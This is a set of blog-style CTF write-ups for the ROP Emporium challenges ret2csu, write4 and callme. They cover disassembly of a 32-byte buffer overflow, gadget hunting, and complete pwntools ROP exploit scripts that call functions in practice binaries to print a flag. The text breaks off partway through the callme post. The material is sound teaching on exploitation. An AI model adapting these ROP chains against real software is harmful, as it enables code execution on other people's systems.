[{"content":"Introduction Challenge description\n We\u0026rsquo;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website https://ropemporium.com\n After downloading the binary, check the enabled protections and mitigation\u0026rsquo;s. Only NX and Partial RELRO protections are turned on as shown below.\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabledrop PIE: No PIE (0x400000) First step is to find the vulnerability in the binary that will enable us to subvert the program execution control flow. From the disassembly of the main function we are only calling pwnme function.\n(gdb) disas main Dump of assembler code for function main: 0x0000000000400607 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000400608 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000040060b \u0026lt;+4\u0026gt;:\tcall 0x400500 \u0026lt;pwnme@plt\u0026gt; 0x0000000000400610 \u0026lt;+9\u0026gt;:\tmov eax,0x0 0x0000000000400615 \u0026lt;+14\u0026gt;:\tpop rbp 0x0000000000400616 \u0026lt;+15\u0026gt;:\tret End of assembler dump. The function reference the got table in order to load the actual address of pwnme function from libret2csu.so library after the first call.\npwnme Disassembly (gdb) disas pwnme Dump of assembler code for function pwnme: 0x000000000000093a \u0026lt;+0\u0026gt;:\tpush rbp 0x000000000000093b \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000000093e \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x0000000000000942 \u0026lt;+8\u0026gt;:\tmov rax,QWORD PTR [rip+0x201697] # 0x201fe0 0x0000000000000949 \u0026lt;+15\u0026gt;:\tmov rax,QWORD PTR [rax] 0x000000000000094c \u0026lt;+18\u0026gt;:\tmov ecx,0x0 0x0000000000000951 \u0026lt;+23\u0026gt;:\tmov edx,0x2 0x0000000000000956 \u0026lt;+28\u0026gt;:\tmov esi,0x0 0x000000000000095b \u0026lt;+33\u0026gt;:\tmov rdi,rax 0x000000000000095e \u0026lt;+36\u0026gt;:\tcall 0x820 \u0026lt;setvbuf@plt\u0026gt; 0x0000000000000963 \u0026lt;+41\u0026gt;:\tlea rdi,[rip+0x31e] # 0xc88 0x000000000000096a \u0026lt;+48\u0026gt;:\tcall 0x7a0 \u0026lt;puts@plt\u0026gt; 0x000000000000096f \u0026lt;+53\u0026gt;:\tlea rdi,[rip+0x32a] # 0xca0 0x0000000000000976 \u0026lt;+60\u0026gt;:\tcall 0x7a0 \u0026lt;puts@plt\u0026gt; 0x000000000000097b \u0026lt;+65\u0026gt;:\tlea rax,[rbp-0x20] 0x000000000000097f \u0026lt;+69\u0026gt;:\tmov edx,0x20 0x0000000000000984 \u0026lt;+74\u0026gt;:\tmov esi,0x0 0x0000000000000989 \u0026lt;+79\u0026gt;:\tmov rdi,rax 0x000000000000098c \u0026lt;+82\u0026gt;:\tcall 0x7d0 \u0026lt;memset@plt\u0026gt; 0x0000000000000991 \u0026lt;+87\u0026gt;:\tlea rdi,[rip+0x310] # 0xca8 0x0000000000000998 \u0026lt;+94\u0026gt;:\tcall 0x7a0 \u0026lt;puts@plt\u0026gt; 0x000000000000099d \u0026lt;+99\u0026gt;:\tlea rdi,[rip+0x36e] # 0xd12 0x00000000000009a4 \u0026lt;+106\u0026gt;:\tmov eax,0x0 0x00000000000009a9 \u0026lt;+111\u0026gt;:\tcall 0x7c0 \u0026lt;printf@plt\u0026gt; 0x00000000000009ae \u0026lt;+116\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000000009b2 \u0026lt;+120\u0026gt;:\tmov edx,0x200 0x00000000000009b7 \u0026lt;+125\u0026gt;:\tmov rsi,rax 0x00000000000009ba \u0026lt;+128\u0026gt;:\tmov edi,0x0 0x00000000000009bf \u0026lt;+133\u0026gt;:\tcall 0x7f0 \u0026lt;read@plt\u0026gt; 0x00000000000009c4 \u0026lt;+138\u0026gt;:\tlea rdi,[rip+0x34a] # 0xd15 0x00000000000009cb \u0026lt;+145\u0026gt;:\tcall 0x7a0 \u0026lt;puts@plt\u0026gt; 0x00000000000009d0 \u0026lt;+150\u0026gt;:\tnop 0x00000000000009d1 \u0026lt;+151\u0026gt;:\tleave 0x00000000000009d2 \u0026lt;+152\u0026gt;:\tret End of assembler dump. (gdb) From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes. we are reading 0x200 from the standard input file descriptor, which is more than the buffer size. The c equivalent of the above vulnerability is,\nread(0, *(rbp-0x20), 0x200) #reading 0x200 from the stdin For exploitation purpose, is to control the return address of the pwnme function and redirect the execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.\n ret control \nFrom the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the NX execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.\nlibc_csu_init Disassembly Below is the disassembled code for __libc_csu_init section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.\n0000000000400640 \u0026lt;__libc_csu_init\u0026gt;: 400640:\t41 57 push r15 400642:\t41 56 push r14 400644:\t49 89 d7 mov r15,rdx 400647:\t41 55 push r13 400649:\t41 54 push r12 40064b:\t4c 8d 25 9e 07 20 00 lea r12,[rip+0x20079e] # 600df0 \u0026lt;__frame_dummy_init_array_entry\u0026gt; 400652:\t55 push rbp 400653:\t48 8d 2d 9e 07 20 00 lea rbp,[rip+0x20079e] # 600df8 \u0026lt;__do_global_dtors_aux_fini_array_entry\u0026gt; 40065a:\t53 push rbx 40065b:\t41 89 fd mov r13d,edi 40065e:\t49 89 f6 mov r14,rsi 400661:\t4c 29 e5 sub rbp,r12 400664:\t48 83 ec 08 sub rsp,0x8 400668:\t48 c1 fd 03 sar rbp,0x3 40066c:\te8 5f fe ff ff call 4004d0 \u0026lt;_init\u0026gt; 400671:\t48 85 ed test rbp,rbp 400674:\t74 20 je 400696 \u0026lt;__libc_csu_init+0x56\u0026gt; 400676:\t31 db xor ebx,ebx 400678:\t0f 1f 84 00 00 00 00 nop DWORD PTR [rax+rax*1+0x0] 40067f:\t00 400680:\t4c 89 fa mov rdx,r15 400683:\t4c 89 f6 mov rsi,r14 400686:\t44 89 ef mov edi,r13d 400689:\t41 ff 14 dc call QWORD PTR [r12+rbx*8] 40068d:\t48 83 c3 01 add rbx,0x1 400691:\t48 39 dd cmp rbp,rbx 400694:\t75 ea jne 400680 \u0026lt;__libc_csu_init+0x40\u0026gt; 400696:\t48 83 c4 08 add rsp,0x8 40069a:\t5b pop rbx 40069b:\t5d pop rbp 40069c:\t41 5c pop r12 40069e:\t41 5d pop r13 4006a0:\t41 5e pop r14 4006a2:\t41 5f pop r15 4006a4:\tc3 ret 4006a5:\t90 nop 4006a6:\t66 2e 0f 1f 84 00 00 cs nop WORD PTR [rax+rax*1+0x0] 4006ad:\t00 00 00 00000000004006b0 \u0026lt;__libc_csu_fini\u0026gt;: 4006b0:\tf3 c3 repz ret z The __libc_csu_init section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control RBX, RBP, R12, R13, R14, and R15 registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.\nThe first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.\n40069a:\t5b pop rbx 40069b:\t5d pop rbp 40069c:\t41 5c pop r12 40069e:\t41 5d pop r13 4006a0:\t41 5e pop r14 4006a2:\t41 5f pop r15 4006a4:\tc3 ret For the second stage, we need to look for the gadgets that will enable us to control the RDI, RSI and RDX registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in RDI, RSI and RDX registers respectively. From the disassembly of __libc_csu_init we can get our second gadget to build our rop chain.\nmov rdx,r15 mov rsi,r14 mov edi,r13d call QWORD PTR [r12+rbx*8] From the above code, we are now able to control the rdx, rsi and edi registers.The call in the second stage gadgets, calculates the destination address of our code.\nBecause we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to ret2win challenge.\n This challenge is very similar to \u0026ldquo;callme\u0026rdquo;, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the \u0026ldquo;callme\u0026rdquo; challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM \u0026amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.\n From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.\nrdi \u0026lt;-- r13 \u0026lt;-- #first args 0xdeadbeefdeadbeef rsi \u0026lt;-- r14 \u0026lt;-- #second args 0xcafebabecafebabe rdx \u0026lt;-- r15 \u0026lt;-- #third args 0xd00df00dd00df00d From the code snip above, we are now able to control the values of ropchain by setting the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb. Debugging our exploit ensures that there is no unexpected behavior in the code to avoid crashing of the program.\nFor debugging purposes, we set a breakpoint in our first address of the ropchain gadget, and run our program with the generated payload.\n(gdb) break *0x000000000040069a Breakpoint 1 at 0x40069a (gdb) r \u0026lt;/tmp/payload Starting program: /home/vx/Downloads/rop/rop/ret2csu/ret2csu \u0026lt;/tmp/payload Breakpoint 1, 0x000000000040069a in __libc_csu_init () (gdb) c Continuing. ret2csu by ROP Emporium x86_64 Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge. \u0026gt; Thank you! Breakpoint 1, 0x000000000040069a in __libc_csu_init () (gdb) When the program is run,its hits the breakpoint. We enter c command for continue, to continue the execution of our program. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of the breakpoint, the execution stops. Now we can inspect the memory addresses in order to understand the behavior of the program and the values loaded in the registers loaded in our first chain.\n(gdb) x/10i $rip =\u0026gt; 0x40069a \u0026lt;__libc_csu_init+90\u0026gt;:\tpop rbx 0x40069b \u0026lt;__libc_csu_init+91\u0026gt;:\tpop rbp 0x40069c \u0026lt;__libc_csu_init+92\u0026gt;:\tpop r12 0x40069e \u0026lt;__libc_csu_init+94\u0026gt;:\tpop r13 0x4006a0 \u0026lt;__libc_csu_init+96\u0026gt;:\tpop r14 0x4006a2 \u0026lt;__libc_csu_init+98\u0026gt;:\tpop r15 0x4006a4 \u0026lt;__libc_csu_init+100\u0026gt;:\tret 0x4006a5:\tnop 0x4006a6:\tnop WORD PTR cs:[rax+rax*1+0x0] 0x4006b0 \u0026lt;__libc_csu_fini\u0026gt;:\trepz ret Now we can Single step through our assembly code and view the value stored in the register values of our gadget. The command for single stepping in gdb is si.\n(gdb) i r rbx rbp r12 r13 r14 r15 rbx 0x4343434343434343 4846791580151137091 rbp 0x4242424242424242 0x4242424242424242 r12 0x4141414141414141 4702111234474983745 r13 0xdeadbeefdeadbeef -2401053088876216593 r14 0xcafebabecafebabe -3819410105351357762 r15 0xd00df00dd00df00d -3454841397007486963 (gdb) From the analysis, we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.\nimport pwn pop_gadget = pwn.p64(0x0040069a) payload =b\u0026#34;A\u0026#34;*32 #fill the buffer payload +=b\u0026#34;B\u0026#34;*8 #rbp(saved) payload += pop_gadget #retaddr payload += pwn.p64(0x4343434343434343)#rbx payload += pwn.p64(0x4242424242424242)#rbp payload += pwn.p64(0x4141414141414141) #r12 payload += pwn.p64(0xdeadbeefdeadbeef) #r13 payload += pwn.p64(0xcafebabecafebabe) #r14 payload += pwn.p64(0xd00df00dd00df00d) #r15 open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;).write(payload) Now, because we are able to control the registers we want, we need to determine the correct or desired values for rbx, rbp and r12 registers because 0x41\u0026hellip;, 0x42\u0026hellip;., 0x43\u0026hellip; are not valid memory addresses. Because after execution of our second rop gadget, we need to set right values of rbp and rbx due to a loop conditional.\n0x0000000000400680 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400683 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400686 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400689 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040068d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400691 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x0000000000400694 \u0026lt;+84\u0026gt;:\tjne 0x400680 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400696 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 The address of second gadget starts at 0x0000000000400680,in which we are setting the values of rdi,r14 and rdx with correct argument values. we need to set the values of rbx and rbp correctly so that conditional cmp is always true. Because of add instruction of 1 to rbx, we need to set the rbx value to 0 and rbp value to 1. when the comparison is being done, the values are equal and Zero flag is set. Adjust values in payload script and single step to confirm the validity of new values in the memory.\nFor register r12, we set the value to a memory region that is executable. In the binary, the .bss section is executable. we now set the r12 register with the memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.\nLastly we need to control the rdi register with the value 0xdeadbeefdeadbeef. Because we have full control of rdx and rsi register, we need to look for pop rdi, ret gadget.\nThe pop rdi, ret gadget\n0x004006a3 5f pop rdi 0x004006a4 c3 ret Now we can pass the 0xdeadbeefdeadbeef argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.\nExploit The full code of the rop is as shown below.\nimport pwn pwn.context.encoding = \u0026#34;latin-1\u0026#34; pwn.warnings.simplefilter(\u0026#34;ignore\u0026#34;) pwn.context.arch = \u0026#34;amd64\u0026#34; io = pwn.process(\u0026#39;./ret2csu\u0026#39;) #arguments passed to ret2win function ret2win(arg1, arg2, arg3) arg1 =pwn.p64(0xdeadbeefdeadbeef) arg2 =pwn.p64(0xcafebabecafebabe) arg3 =pwn.p64(0xd00df00dd00df00d) ret2win_addr =pwn.p64(io.elf.plt[\u0026#39;ret2win\u0026#39;]) #resolve address of ret2win function pop_rbx_rbp_r12_r13_r14_r15_addr = pwn.p64(0x0040069a) #first stage gadget dereference_pointer = pwn.p64(0x00600e48) #bss area which is executable stage2_addr = pwn.p64(0x00400680) #addr of second stage rop chain pop_rdi = pwn.p64(0x004006a3) #ropchains #stage1 ropchain \u0026#39;\u0026#39;\u0026#39; 0x0040069a pop rbx │ 0x0040069b pop rbp │ 0x0040069c pop r12 │ 0x0040069e pop r13 │ 0x004006a0 pop r14 │ 0x004006a2 pop r15 └ 0x004006a4 ret \u0026#39;\u0026#39;\u0026#39; #Determine the loop values for conditional branch \u0026#39;\u0026#39;\u0026#39; ╎│ 0x00400689 call qword [r12 + rbx*8] │ ╎│ 0x0040068d add rbx, 1 │ ╎│ 0x00400691 cmp rbp, rbx │ └──\u0026lt; 0x00400694 jne 0x400680 \u0026#39;\u0026#39;\u0026#39; stage1 = pop_rbx_rbp_r12_r13_r14_r15_addr stage1 += pwn.p64(0) #set RBP=0 stage1 += pwn.p64(1) #set RBX=1 stage1 += dereference_pointer #set R12 stage1 += arg1 #R13 stage1 += arg2 #R14 stage1 += arg3 #R15 stage1 += stage2_addr stage1 += pwn.p64(0)*7 #adjust the stack #stage2 \u0026#39;\u0026#39;\u0026#39; ┌──\u0026gt; 0x00400680 mov rdx, r15 │ ╎│ 0x00400683 mov rsi, r14 │ ╎│ 0x00400686 mov edi, r13d │ ╎│ 0x00400689 call qword [r12 + rbx*8] \u0026#39;\u0026#39;\u0026#39; stage2 = pop_rdi stage2 +=arg1 stage2 +=ret2win_addr payload = b\u0026#34;A\u0026#34;*32 payload += b\u0026#34;B\u0026#34;*8 payload += b\u0026#34;\u0026#34; .join([ stage1, stage2 ]) io.writeafter(\u0026#39;\u0026gt;\u0026#39;, payload) pwn.info(io.recvall().decode()) Running the exploit code above we get the correct flag\nvx@archie:ret2csu$ python3 xpl.py [+] Starting local process \u0026#39;./ret2csu\u0026#39;: pid 18869 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b\u0026#39;.\u0026#39; [+] Receiving all data: Done (45B) [*] Process \u0026#39;./ret2csu\u0026#39; stopped with exit code 0 (pid 18869) [*] Thank you! ROPE{a_placeholder_32byte_flag!} References  Universal ROP or Return-to-csu Linux program startup  ","date":"2021-12-20T20:50:44+03:00","image":"https://thuri10.github.io/post/ropemporium/retcsu.jpg","permalink":"https://thuri10.github.io/p/return-oriented-programming-retcsu/","title":"Return-Oriented Programming - Retcsu"},{"content":"Introduction Challenge Description\n Our first foray into proper gadget use. A useful function is still present, but we\u0026rsquo;ll need to write a string into memory somehow.\n The goal of this challenge is understanding how to abuse readable and writable memory regions in binary files.The target binary can be downloaded from the authors website ropemporium.\nFirst we check the binary protections enabled on the downloaded binary. Only NX (Not executable) is enabled on the binary according to checksec binary utility as shown in image below.\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) For analysis of binary, we use gdb debugger to analyze the functions in the binary. We disassemble the main function which is the entry point of analysis.\n(gdb) disas main Dump of assembler code for function main: 0x0000000000400607 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000400608 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000040060b \u0026lt;+4\u0026gt;:\tcall 0x400500 \u0026lt;pwnme@plt\u0026gt; 0x0000000000400610 \u0026lt;+9\u0026gt;:\tmov eax,0x0 0x0000000000400615 \u0026lt;+14\u0026gt;:\tpop rbp 0x0000000000400616 \u0026lt;+15\u0026gt;:\tret End of assembler dump. (gdb) From the above, the main function only calls pwnme function which looks interesting to us. Disassemble the pwnme function as shown below. pwnme@plt is used for referencing the pwnme real address. we disassemble the libwrite4 library as shown in the code below.\nvx@archie:write4$ gdb -q libwrite4.so Reading symbols from libwrite4.so... (No debugging symbols found in libwrite4.so) (gdb) disas pwnme Dump of assembler code for function pwnme: 0x00000000000008aa \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000000008ab \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000000008ae \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x00000000000008b2 \u0026lt;+8\u0026gt;:\tmov rax,QWORD PTR [rip+0x200727] # 0x200fe0 0x00000000000008b9 \u0026lt;+15\u0026gt;:\tmov rax,QWORD PTR [rax] 0x00000000000008bc \u0026lt;+18\u0026gt;:\tmov ecx,0x0 0x00000000000008c1 \u0026lt;+23\u0026gt;:\tmov edx,0x2 0x00000000000008c6 \u0026lt;+28\u0026gt;:\tmov esi,0x0 0x00000000000008cb \u0026lt;+33\u0026gt;:\tmov rdi,rax 0x00000000000008ce \u0026lt;+36\u0026gt;:\tcall 0x790 \u0026lt;setvbuf@plt\u0026gt; 0x00000000000008d3 \u0026lt;+41\u0026gt;:\tlea rdi,[rip+0x106] # 0x9e0 0x00000000000008da \u0026lt;+48\u0026gt;:\tcall 0x730 \u0026lt;puts@plt\u0026gt; 0x00000000000008df \u0026lt;+53\u0026gt;:\tlea rdi,[rip+0x111] # 0x9f7 0x00000000000008e6 \u0026lt;+60\u0026gt;:\tcall 0x730 \u0026lt;puts@plt\u0026gt; 0x00000000000008eb \u0026lt;+65\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000000008ef \u0026lt;+69\u0026gt;:\tmov edx,0x20 0x00000000000008f4 \u0026lt;+74\u0026gt;:\tmov esi,0x0 0x00000000000008f9 \u0026lt;+79\u0026gt;:\tmov rdi,rax 0x00000000000008fc \u0026lt;+82\u0026gt;:\tcall 0x760 \u0026lt;memset@plt\u0026gt; 0x0000000000000901 \u0026lt;+87\u0026gt;:\tlea rdi,[rip+0xf8] # 0xa00 0x0000000000000908 \u0026lt;+94\u0026gt;:\tcall 0x730 \u0026lt;puts@plt\u0026gt; 0x000000000000090d \u0026lt;+99\u0026gt;:\tlea rdi,[rip+0x115] # 0xa29 0x0000000000000914 \u0026lt;+106\u0026gt;:\tmov eax,0x0 0x0000000000000919 \u0026lt;+111\u0026gt;:\tcall 0x750 \u0026lt;printf@plt\u0026gt; 0x000000000000091e \u0026lt;+116\u0026gt;:\tlea rax,[rbp-0x20] 0x0000000000000922 \u0026lt;+120\u0026gt;:\tmov edx,0x200 0x0000000000000927 \u0026lt;+125\u0026gt;:\tmov rsi,rax 0x000000000000092a \u0026lt;+128\u0026gt;:\tmov edi,0x0 0x000000000000092f \u0026lt;+133\u0026gt;:\tcall 0x770 \u0026lt;read@plt\u0026gt; 0x0000000000000934 \u0026lt;+138\u0026gt;:\tlea rdi,[rip+0xf1] # 0xa2c 0x000000000000093b \u0026lt;+145\u0026gt;:\tcall 0x730 \u0026lt;puts@plt\u0026gt; 0x0000000000000940 \u0026lt;+150\u0026gt;:\tnop 0x0000000000000941 \u0026lt;+151\u0026gt;:\tleave 0x0000000000000942 \u0026lt;+152\u0026gt;:\tret End of assembler dump. (gdb) From the code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset function is used to overwrite any values that have the memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer in the stack.\n \nTherefore the next interesting function is read function, which reads for user input and stores in the specified buffer.From the above disassembled code, we are reading 0x200 bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.\nssize_t read(int fd, void *buf, size_t count); // read(0,[rbp-0x20], 0x200) From the vulnerability,we can exploit it in order to abuse the control flow of the program through controlling the value of the return address.\nFrom the authors hint , we need to look for an ELF section that is writable in order to write our string.\n Perhaps the most important thing to consider in this challenge is where we\u0026rsquo;re going to write our \u0026ldquo;flag.txt\u0026rdquo; string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Opening the binary in radare2, we can check the permissions of different sections using the command iS as in the image above.  \n From the above we are able to determine the data and bss section is both readable and writable. Our target for the ropchain is to write our string to the bss section. Therefore we need to get memory address of .bss area.\nFrom the authors challenge hint, we need to disassemble usefulFunction to understand how it works.\n Important! A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like \u0026ldquo;flag.txt\u0026rdquo;) as the 1st argument.\n From the disassembly of the binary, we have an interesting function called usefulFunction. The function is responsible for calling print_file function as hinted by the author.\n \nFrom the analysis of the above function, we can determine we are passing a string file name called \u0026ldquo;nonexistent\u0026rdquo; to the print_file function. The content of the arguments passed to the print_file function will be printed out to the user. Our goal is to pass our string of interest flag.txt to the the print_file function.\nFrom the disassembly of the binary we have another interesting function called usefulGadgets.\n(gdb) disas usefulGadgets Dump of assembler code for function usefulGadgets: 0x0000000000400628 \u0026lt;+0\u0026gt;:\tmov QWORD PTR [r14],r15 0x000000000040062b \u0026lt;+3\u0026gt;:\tret 0x000000000040062c \u0026lt;+4\u0026gt;:\tnop DWORD PTR [rax+0x0] End of assembler dump. (gdb) The gadget from the above disassembled code will enable us to write content in r15 register to memory address [r14]. Next step is to look for gadgets that will enable us to control both the r14 and r15 register values.\nFor building our ropchain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.In x86 assembly pop instruction is used for putting value to the memory address, therefore we look for a pop gadget that will enable to control both r14 and r15.\n0x0040068f 5d pop rbp 0x00400690 415e pop r14 0x00400692 415f pop r15 0x00400694 c3 ret Example of the above gadget, we have a pop rbp, pop r14, pop 15 ret instruction gadget. This gadget will enable us to control the desired registers. Because we dont need the rbp register, for our ropchain, we take the address pointed py pop14 0x00400690 . This is possible because rop gadgets are set of instructions that end with ret.\nFrom the disassembly of usedfulgadgets function we know register r14 points to a memory region we want to write to. Therefore our strategy is to set the value of r14 register to be the address pointer of .bss section of ELF and r15 register to be the value we want to write to the .bss section.\n Hopefully you\u0026rsquo;ve realised that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won\u0026rsquo;t be using built-in functionality since that\u0026rsquo;s too similar to the previous challenges, instead we\u0026rsquo;ll be looking for gadgets that let us write a value to memory such as mov [reg], reg.\n 0x00400628 4d893e mov qword [r14], r15 0x0040062b c3 ret Therefore, the two gadgets that will enable us to set the register values of r14 and r15 and copy the values of r15 to the memory region defined by r14.\nLast is a find a gadget that will aid passing of an argument to the print_file function. Because the function takes one oner argument as a parameter, we look for a pop rdi ret instruction\n0x00400693 5f pop rdi 0x00400694 c3 ret Now we have three separate rop gadgets, which we can chain them together to get a fully working rop chain. This chain will enable us to read the file content of the flag.txt and display output to the console.\nExploit A fully working ropchain exploit of the challenge is,\nimport pwn pwn.context.arch = \u0026#34;amd64\u0026#34; pwn.context.encoding =\u0026#34;latin-1\u0026#34; pwn.warnings.simplefilter(\u0026#34;ignore\u0026#34;) io = pwn.process(\u0026#39;./write4\u0026#39;) bss_area = pwn.p64(0x00601038) pop_r14_r15 = pwn.p64(0x00400690) pop_rdi = pwn.p64(0x00400693) mov_r14_r15 = pwn.p64(0x00400628) print_file_addr = pwn.p64(0x0000000000400510) payload = b\u0026#34;A\u0026#34; * 32 #fill the buffer payload += b\u0026#34;B\u0026#34; *8 #overwrite the base pointer payload += pop_r14_r15 payload += bss_area payload += b\u0026#34;flag.txt\u0026#34; payload += mov_r14_r15 payload += pop_rdi payload += bss_area payload += print_file_addr io.writeafter(\u0026#39;\u0026gt;\u0026#39;, payload) pwn.info(io.recvall().decode()) Successful execution of our exploit above we get a correct flag.\nvx@archie:write4$ python3 x.py [+] Starting local process \u0026#39;./write4\u0026#39;: pid 7275 [+] Receiving all data: Done (45B) [*] Process \u0026#39;./write4\u0026#39; stopped with exit code -11 (SIGSEGV) (pid 7275) [*] Thank you! ROPE{a_placeholder_32byte_flag!} ","date":"2021-12-20T20:49:54+03:00","image":"https://thuri10.github.io/post/ropemporium/write4.jpg","permalink":"https://thuri10.github.io/p/return-oriented-programming-write4/","title":"Return-Oriented Programming - Write4"},{"content":"Introduction Challenge Description\nThe goal of this challenge is to understand how more than one argument is passed in x64 function. The challenge can be downloaded from the authors website ropemporium\n Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.\n The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.\n You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)\n First we check the binary protections enabled on the callme binary, only NX( Not Executable) is enabled on the binary as shown below.\nvx@archie:callme$ checksec --file callme Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b\u0026#39;.\u0026#39; Open the callme binary in radare2 to look for exploitable vulnerability and examine the behavior of the binary. radare2 is a powerful disassembler/debugging tool in Linux, used for examining the behavior of programs.\n \nFrom the above image we use pdf command in to do disassembly at a given function. From the image above, the function pwnme looks similar to the previous challenges ret2win and split.\nFrom the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.  \nTherefore the next function is read function, which reads for user input and stores in the specified buffer.\nssize_t read(int fd, void *buf, size_t count); From the above disassembled code, we are reading 0x200 bytes from the standard input file descriptor and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.\nFor exploitation stack overflow, we need to fill our buffer, overwrite the rbp register and control the return address.\nFor building our ropchain, we need to understand the calling conventions of AMD64 ABI. The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.\nBecause the system function receives one argument, we need to look for one gadgets that we control the rdi, rsi and rdx registers.\nWhat are gadgets?\nGadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.\nThe example of the pop rdi,pop rsi,pop rdx, ret gadget is shown in image below.\n \nNext step is to determine the address of callme_one, callme_two, callme_three functions. For determining the functions address we use gdb to get the memory addresses.\n(gdb) info functions All defined functions: Non-debugging symbols: 0x00000000004006a8 _init 0x00000000004006d0 puts@plt 0x00000000004006e0 printf@plt 0x00000000004006f0 callme_three@plt 0x0000000000400700 memset@plt 0x0000000000400710 read@plt 0x0000000000400720 callme_one@plt 0x0000000000400730 setvbuf@plt 0x0000000000400740 callme_two@plt 0x0000000000400750 exit@plt 0x0000000000400760 _start 0x0000000000400790 _dl_relocate_static_pie 0x00000000004007a0 deregister_tm_clones 0x00000000004007d0 register_tm_clones 0x0000000000400810 __do_global_dtors_aux 0x0000000000400840 frame_dummy 0x0000000000400847 main 0x0000000000400898 pwnme 0x00000000004008f2 usefulFunction 0x000000000040093c usefulGadgets 0x0000000000400940 __libc_csu_init 0x00000000004009b0 __libc_csu_fini 0x00000000004009b4 _fini (gdb) Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the callme binary does PLT relocations of the functions of callme* , we need to disassemble the target shared library libcallme.so as shown below.\nvx@archie:callme$ gdb -q libcallme.so Reading symbols from libcallme.so... (No debugging symbols found in libcallme.so) (gdb) disas callme_one Dump of assembler code for function callme_one: 0x000000000000081a \u0026lt;+0\u0026gt;:\tpush rbp 0x000000000000081b \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000000081e 